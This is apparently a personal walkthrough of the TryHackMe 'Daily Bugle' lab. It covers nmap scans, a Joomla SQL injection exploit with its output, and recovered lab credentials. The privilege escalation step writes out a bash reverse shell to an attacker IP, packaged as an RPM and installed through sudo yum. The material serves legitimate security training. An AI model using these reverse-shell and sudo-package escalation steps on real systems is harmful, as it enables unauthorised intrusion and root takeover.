# Daily Bugle TryHackMe Walkthrough

## All Ports Scan

```bash
# Nmap 7.91 scan initiated Wed Jun 23 16:57:14 2021 as: nmap -T4 -sT -vv -p- -oA nmap/allports 10.10.97.195
Warning: 10.10.97.195 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.97.195
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2021-06-23 16:57:14 EDT for 972s
Not shown: 65525 closed ports
Reason: 65525 conn-refused
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack
80/tcp    open     http    syn-ack
1469/tcp  filtered aal-lm  no-response
21248/tcp filtered unknown no-response
30148/tcp filtered unknown no-response
30171/tcp filtered unknown no-response
34926/tcp filtered unknown no-response
37086/tcp filtered unknown no-response
60833/tcp filtered unknown no-response
62058/tcp filtered unknown no-response

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jun 23 17:13:26 2021 -- 1 IP address (1 host up) scanned in 971.46 seconds
```
## Complete Scan

```bash
# Nmap 7.91 scan initiated Wed Jun 23 17:16:03 2021 as: nmap -T4 -sT -sV -sC -A -vv -p22,80 -oA nmap/complete 10.10.97.195
Nmap scan report for 10.10.97.195
Host is up, received echo-reply ttl 63 (0.18s latency).
Scanned at 2021-06-23 17:16:03 EDT for 97s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.19 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=6/23%OT=22%CT=%CU=36749%PV=Y%DS=2%DC=T%G=N%TM=60D3A4F4%P=x86_64-pc-linux-gnu)
SEQ(SP=108%GCD=1%ISR=10C%TI=Z%TS=A)
SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)
OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.012 days (since Wed Jun 23 17:01:03 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   141.35 ms 10.8.0.1
2   173.16 ms 10.10.97.195

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 23 17:17:40 2021 -- 1 IP address (1 host up) scanned in 96.82 seconds
```
## Port 80 Enumeration

![](Images/Pasted%20image%2020210623170246.png)

```bash
Username : Super User
SpiderMan rob the bank
```

![](Images/Pasted%20image%2020210623170625.png)

![](Images/Pasted%20image%2020210623170641.png)

```bash
Exploit : 
https://github.com/NinjaJc01/joomblah-3
```

```bash
[$] Found user', ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', ''])
```

![](Images/Pasted%20image%2020210623183336.png)

![](Images/Pasted%20image%2020210623180803.png)

![](Images/Pasted%20image%2020210623180926.png)

```java
DB Creds
root:nv5uz9r3ZEDzVjNu
jjameson:nv5uz9r3ZEDzVjNu
jonah:spiderman123
```

## Privelege Escalation

![](Images/Pasted%20image%2020210623183216.png)

```java
Attacker PC
root.sh
	#!/bin/bash
	bash -i >& /dev/tcp/10.8.199.231/443 0>&1
	
# fpm -n root -s dir -t rpm -a all --before-install root.sh .

Client PC
$ sudo yum localinstall -y root-1.0-1.noarch.rpm
```